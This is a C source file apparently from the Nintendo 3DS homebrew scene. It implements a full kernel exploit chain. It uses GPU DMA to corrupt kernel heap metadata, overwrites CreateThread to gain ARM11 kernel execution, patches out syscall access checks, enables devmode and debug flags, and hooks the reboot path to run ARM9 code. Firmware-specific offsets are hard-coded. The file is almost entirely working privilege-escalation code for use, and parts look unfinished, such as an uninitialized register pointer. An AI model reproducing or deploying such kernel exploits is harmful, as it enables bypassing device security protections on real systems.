#include <3ds.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <malloc.h>
#include <dirent.h>

u32 nop_slide[0x1000] __attribute__((aligned(0x1000)));
unsigned int patch_addr;
unsigned int svc_patch_addr;
unsigned char patched_svc = 0;
unsigned int kversion;
u32 **ppKProcess;
u32 *pDevmode;
u8 *offs_exheader_flags;
u8 isN3DS = 0;
u32 *backup;
unsigned int *arm11_buffer;

#define wait() svcSleepThread(1000000000ull)

void sub_20CC(void){
	__asm__ ("LDR R1, =0xFFFCC48C\t\n"
	  		  "1:\t\n"
	           "LDRH R2, [R1,#4]\t\n"
	           "TST R2, #2\t\n"
	           "BNE 1b\t\n"
	           "STR R0, [R1,#8]\t\n"
	           "BX LR");
}

void sub_20E4(void){
	__asm__ ("LDR R0, =0xFFFCC48C\t\n"
	  		   "LDRB R1, [R0,#3]\t\n"
	           "ORR R1, R1, #0x40\t\n"
	           "STRB R1, [R0,#3]\t\n"
	           "BX LR");
}

void sub_20F8(void){
	__asm__ ("LDR R0, =0xFFFCC48C\t\n"
	  		  "2:\t\n"
	           "LDRH R1, [R0,#4]\t\n"
	           "TST R1, #0x100\t\n"
	           "BNE 2b\t\n"
	           "LDR R0, [R0,#0xC]\t\n"
	           "BX LR");
}

int do_gshax_copy(void *dst, void *src, unsigned int len)
{
	unsigned int check_mem = linearMemAlign(0x10000, 0x40);
	int i = 0;

	// Sometimes I don't know the actual value to check (when copying from unknown memory)
	// so instead of using check_mem/check_off, just loop "enough" times.
	for (i = 0; i < 5; ++i) {
		GSPGPU_FlushDataCache (NULL, src, len);
		GX_SetTextureCopy(NULL, src, 0, dst, 0, len, 8);
		GSPGPU_FlushDataCache (NULL, check_mem, 16);
		GX_SetTextureCopy(NULL, src, 0, check_mem, 0, 0x40, 8);
	}

	linearFree(check_mem);

	return 0;
}

void dump_bytes(void *dst) {
	printf("DUMPING %p\n", dst);
	do_gshax_copy(arm11_buffer, dst, 0x20u);

	printf(" 0: %08X  4: %08X  8: %08X\n12: %08X 16: %08X 20: %08X\n",
			arm11_buffer[0], arm11_buffer[1], arm11_buffer[2],
			arm11_buffer[3], arm11_buffer[4], arm11_buffer[5]);
}
   
/* Corrupts arm11 kernel code (CreateThread()) in order to
   open a door for arm11 code execution with kernel privileges.
*/
int corrupt_arm11_kernel_code(void)
{
	unsigned int *test;
	int i;
	int (*nop_func)(void);
	int *ipc_buf;
	int model;

	// get proper patch address for our kernel -- thanks yifanlu once again
	kversion = *(unsigned int *)0x1FF80000; // KERNEL_VERSION register
	
	ppKProcess = (u32 *)0xFFFF9004;
	patch_addr = 0;
	svc_patch_addr = 0;
	APT_CheckNew3DS(NULL, &isN3DS);
	
	//TODO tested on two different kernel versions only
	offs_exheader_flags = 0xA8;
	pDevmode = 0xFFF2D00A;
	
	if(!isN3DS || kversion < 0x022C0600)
	{
	
		if (kversion == 0x02220000) // 2.34-0 4.1.0
		{
			patch_addr = 0xEFF83C97;
			svc_patch_addr = 0xEFF827CC;
		}
		else if (kversion == 0x02230600) // 2.35-6 5.0.0
		{
			patch_addr = 0xEFF8372F;
			svc_patch_addr = 0xEFF822A8;
		}
		else if (kversion == 0x02240000 || kversion == 0x02250000 || kversion == 0x02260000) // 2.36-0 5.1.0, 2.37-0 6.0.0, 2.38-0 6.1.0
		{
			patch_addr = 0xEFF8372B;
			svc_patch_addr = 0xEFF822A4;
		}
		else if (kversion == 0x02270400) // 2.39-4 7.0.0
		{
			patch_addr = 0xEFF8372F;
			svc_patch_addr = 0xEFF822A8;
		}
		else if (kversion == 0x02280000) // 2.40-0 7.2.0
		{
			patch_addr = 0xEFF8372B;
			svc_patch_addr = 0xEFF822A4;
		}
		else if (kversion == 0x022C0600 || kversion == 0x022E0000) // 2.44-6 8.0.0, 2.26-0 9.0.0
		{
			patch_addr = 0xDFF83837;
			svc_patch_addr = 0xDFF82290;
		}
		else
		{
			printf("Unrecognized kernel version %x, returning...\n", kversion);
			return 0;
		}
	}
	else
	{
		if (kversion == 0x022C0600 || kversion == 0x022E0000) // N3DS 2.44-6 8.0.0, N3DS 2.26-0 9.0.0
		{
			patch_addr = 0xDFF8382F;
			svc_patch_addr = 0xDFF82260;
			offs_exheader_flags = 0xB0;
			pDevmode = 0xFFF2E00A;
		}
		else
		{
			printf("Unsupported kernel version %x, returning... %i\n", kversion);
			return 0;
		}
	}
	printf("Loaded adr %x for kernel %x\n", patch_addr, kversion); 

	// part 1: corrupt kernel memory
	u32 tmp_addr;
	unsigned int mem_hax_mem;
	
	svcControlMemory(&mem_hax_mem, 0, 0, 0x2000, MEMOP_ALLOC_LINEAR, 0x3);
	unsigned int mem_hax_mem_free = mem_hax_mem + 0x1000;

	printf("Freeing memory\n");
	svcControlMemory(&tmp_addr, mem_hax_mem_free, 0, 0x1000, MEMOP_FREE, 0); // free page 

	printf("Backing up heap area:\n");
	do_gshax_copy(arm11_buffer, mem_hax_mem_free, 0x20u);

	u32 saved_heap[8];
	memcpy(saved_heap, arm11_buffer, sizeof(saved_heap));
	printf(" 0: %08X  4: %08X  8: %08X\n12: %08X 16: %08X 20: %08X\n",
			arm11_buffer[0], arm11_buffer[1], arm11_buffer[2],
			arm11_buffer[3], arm11_buffer[4], arm11_buffer[5]);			

	arm11_buffer[0] = 1;
	arm11_buffer[1] = patch_addr;
	arm11_buffer[2] = 0;
	arm11_buffer[3] = 0;

	// overwrite free pointer
	printf("Overwriting free pointer %x\n", mem_hax_mem);
	wait();

	// corrupt heap ctrl structure
	do_gshax_copy(mem_hax_mem_free, arm11_buffer, 0x10u);
	
	// Trigger write to kernel. This will actually cause
	// the CreateThread() kernel code to be corrupted 
	svcControlMemory(&tmp_addr, mem_hax_mem, 0, 0x1000, MEMOP_FREE, 0);

	printf("Triggered kernel write\n");
	gfxFlushBuffers();
	gfxSwapBuffers();
    
	printf("Heap control block after corruption:\n");
	do_gshax_copy(arm11_buffer, mem_hax_mem_free, 0x20u);
	printf(" 0: %08X  4: %08X  8: %08X\n12: %08X 16: %08X 20: %08X\n",
			arm11_buffer[0], arm11_buffer[1], arm11_buffer[2],
			arm11_buffer[3], arm11_buffer[4], arm11_buffer[5]); 

	printf("Restoring heap\n");
	memcpy(arm11_buffer, saved_heap, sizeof(saved_heap));
	do_gshax_copy(mem_hax_mem, arm11_buffer, 0x20u);

	 // part 2: trick to clear icache
	for (i = 0; i < 0x1000; i++)
	{
		arm11_buffer[i] = 0xE1A00000; // ARM NOP instruction
	}
	arm11_buffer[i-1] = 0xE12FFF1E; // ARM BX LR instruction
	nop_func = nop_slide;

	do_gshax_copy(nop_slide, arm11_buffer, 0x10000);

	HB_FlushInvalidateCache();
	nop_func();

	printf("Exited nop slide\n");
	gfxFlushBuffers();
	gfxSwapBuffers();

	return 1;
}

// after running setup, run this to execute func in ARM11 kernel mode
int __attribute__((naked))
temp_arm11_kernel_exec (int (*func)(void))
{
	asm volatile ("svc 8\t\n" // CreateThread syscall, corrupted, args not needed
			 "bx lr\t\n");
}

int __attribute__((naked))
arm11_kernel_execute(int (*func)(void))
{
	asm volatile ("svc #0x7B\t\n"
			 "bx lr\t\n");
}

void test(void)
{
	arm11_buffer[0] = 0xFEAFFAAF;
	doArm9Hax();
}

void jump_table(void)
{
 	func_patch_hook();
 	reboot_func();
}

void doArm9Hax(void)
{
	printf("Setting up Arm9\n");

	int (*reboot)(int, int, int, int) = 0xFFF748C4;

	__asm__ ("clrex");

	CleanEntireDataCache();
	InvalidateEntireInstructionCache();

	// ARM9 code copied to FCRAM 0x23F00000
	//memcpy(0xF3F00000, ARM9_PAYLOAD, ARM9_PAYLOAD_LEN);
	// write function hook at 0xFFFF0C80
	//memcpy(0xEFFF4C80, 0x9D23AC, 0x9D2580);

	// write FW specific offsets to copied code buffer
	*(int *)(0xEFFF4C80 + 0x60) = 0xFFFD0000; // PDN regs
	*(int *)(0xEFFF4C80 + 0x64) = 0xFFFD2000; // PXI regs
	*(int *)(0xEFFF4C80 + 0x68) = 0xFFF84DDC; // where to return to from hook

	// patch function 0xFFF84D90 to jump to our hook
	*(int *)(0xFFF84DD4 + 0) = 0xE51FF004; // ldr pc, [pc, #-4]
	*(int *)(0xFFF84DD4 + 4) = 0xFFFF0C80; // jump_table + 0
	// patch reboot start function to jump to our hook
	*(int *)(0xFFFF097C + 0) = 0xE51FF004; // ldr pc, [pc, #-4]
	*(int *)(0xFFFF097C + 4) = 0x8F028C4; // jump_table + 4

	CleanEntireDataCache();

	printf("test1\n");

	reboot(0, 0, 2, 0); // trigger reboot
}

void func_patch_hook(void)
{

	printf("Patching function\n");

  // data written from entry
 	int pdn_regs;
  	int pxi_regs;

	int (*func_hook_return)(void);

  // save context
	__asm__ ("stmfd sp!, {r0-r12,lr}");
  // TODO: Why is this needed?
	__asm__ ("MOV R0, #0");
  	sub_20CC();
  	sub_20E4();
  	__asm__ ("MOV R0, #0x10000");
	sub_20CC();
 	sub_20F8();
 	sub_20F8();
 	sub_20F8();
 
  // TODO: What does this do?
  *(char *)(pdn_regs + 0x230) = 2;
  int i = 0;
  for (i = 0; i < 16; i += 2); // busy spin
  *(char *)(pdn_regs + 0x230) = 0;
  for (i = 0; i < 16; i += 2); // busy spin
  // restore context and run the two instructions that were replaced
  __asm__ ("ldmfd sp!, {r0-r12,lr}\t\n"
          "ldr r0, =0x44836\t\n"
          "str r0, [r1]\t\n"
          "ldr pc, =0xFFF5045C");
}

// this is a patched version of function 0xFFFF097C
void reboot_func(void)
{
	printf("Rebooting\n");

	__asm__ ("ADR R0, 15f\t\n"
          "ADR R1, 12f\t\n"
          "LDR R2, =0x1FFFFC00\t\n"
          "MOV R4, R2\t\n"
          "BL 11f\t\n"
          "BX R4");

	 __asm__ ("11:\t\n"
	 		"SUB R3, R1, R0\t\n"
	 		"MOV R1, R3,ASR#2\t\n"
  			"CMP R1, #0\t\n"
          	"BLE 18f\t\n"
          	"MOVS R1, R3,LSL#29\t\n"
          	"SUB R0, R0, #4\t\n"
          	"SUB R1, R2, #4\t\n"
          	"BPL 8f\t\n"
          	"LDR R2, [R0,#4]!\t\n"
          	"STR R2, [R1,#4]!\t\n"
	 		"8:\t\n"
  			"MOVS R2, R3,ASR#3\t\n"
          	"BEQ 18f\t\n"
			"10:\t\n"
  			"LDR R3, [R0,#4]\t\n"
          	"SUBS R2, R2, #1\t\n"
          	"STR R3, [R1,#4]\t\n"
          	"LDR R3, [R0,#8]!\t\n"
          	"STR R3, [R1,#8]!\t\n"
          	"BNE 10b\t\n"
			"18:\t\n"
          	"BX LR");


// disable all interrupts
	 __asm__ ("15:\t\n"
	 		"MOV R0, #0x1FFFFFF8\t\n"
  			"MOV R1, #0\t\n"
          	"STR R1, [R0]\t\n"
          	"LDR R1, =0x10163008\t\n"
          	"LDR R2, =0x44846\t\n"
          	"STR R2, [R1]\t\n"
          	"LDR R8, =0x10140000\t\n"
          	"LDR R10, =0x2400000C\t\n"
          	"LDR R9, =0x23F00000\t\n"
          	"mrs r0, cpsr\t\n"
            "orr r0, r0, #0x1C0\t\n"
            "MSR CPSR_cx, R0");

	__asm__ ("3:\t\n"
  			"LDRB R0, [R8]\t\n"
          	"ANDS R0, R0, #1\t\n"
          	"BNE 3b\t\n"
          	"STR R9, [R10]\t\n"
          	"MOV R0, #0x1FFFFFF8");

 	__asm__ ("4:\t\n"
  			"LDR R1, [R0]\t\n"
          	"CMP R1, #0\t\n"
          	"BEQ 4b\t\n"
          	"BX R1");

 	__asm__ ("12:\t\n"
 			"MOV R0, #0\t\n"
 			"MCR p15, 0, R0,c8,c5, 0\t\n"
          	"MCR p15, 0, R0,c8,c6, 0\t\n"
          	"MCR p15, 0, R0,c8,c7, 0\t\n"
          	"MCR p15, 0, R0,c7,c10, 4\t\n"
          	"BX LR");

}

apply_persistent_kernel_patches (void)
{
	u32 old_cpsr;
	old_cpsr = DisableInterrupts();

	// repair CreateThread()
	if(isN3DS && (kversion == 0x022C0600 || kversion == 0x022E0000) && (patch_addr == 0xDFF8382F))   
	{
		// seg001:FFF03830 BL sub_FFF07B44
		*(int *)(patch_addr+1) = 0xEB0010C3;
		// seg001:FFF03834 LDR R1, [SP,#0x10+var_8]    
		*(int *)(patch_addr+5) = 0xE59D1008;
		// seg001:FFF03838 ADD SP, SP, #0xC    
		*(int *)(patch_addr+9) = 0xE28DD00C;         
	}
	else
		*(int *)(patch_addr+8) = 0x8DD00CE5;
			
	// give us access to all SVCs (including 0x7B, so we can return to kernel mode) 
	if(svc_patch_addr > 0)
	{
		*(int *)(svc_patch_addr) = 0xE320F000; //NOP
		*(int *)(svc_patch_addr+8) = 0xE320F000; //NOP
		patched_svc = 1;
	}

	// enable "devmode"
	*((u8 *)pDevmode) |= 0x1;

	// enable debugging
	u32 kproc = *((u32 *)ppKProcess);	
	*((u32 *)(kproc + ((u8 *)offs_exheader_flags))) |= 0x2;
	
	EnableInterrupts(old_cpsr);
	
	CleanEntireDataCache();
	InvalidateEntireInstructionCache();
	
	return 0;
}

int __attribute__((naked))
arm11_kernel_stub (void)
{
	asm volatile ("add sp, sp, #8\t\n");

	apply_persistent_kernel_patches ();

	asm volatile ("movs r0, #0\t\n"
			 "ldr pc, [sp], #4\t\n");
}

int run_exploit()
{
	int result = 0;
	int i;
	
	int (*nop_func)(void);
	HB_ReprotectMemory(nop_slide, 4, 7, &result); 

	for (i = 0; i < 0x1000; i++)
	{
		nop_slide[i] = 0xE1A00000; // ARM NOP instruction
	}
	nop_slide[i-1] = 0xE12FFF1E; // ARM BX LR instruction
	nop_func = nop_slide;
	HB_FlushInvalidateCache();

	printf("Testing nop slide\n");
	nop_func();
	printf("Exited nop slide\n");

	arm11_buffer = linearMemAlign(0x10000, 0x10000);

	// wipe memory for debugging purposes
	for (i = 0; i < 0x1000/sizeof(int); i++)
	{
		arm11_buffer[i] = 0xdeadbeef;
	}

	if(corrupt_arm11_kernel_code ())
	{
		printf("Successfully corrupted kernel code\nApplying further kernel patches...\n");
		wait();

		temp_arm11_kernel_exec (arm11_kernel_stub);
		
		printf("\nExploit %s!\n", patched_svc ? "successful":"failed");

		doArm9Hax();
	}
	else
	{
		printf("Exploit failed [kernel]!\n");
	}
	return 0;
}
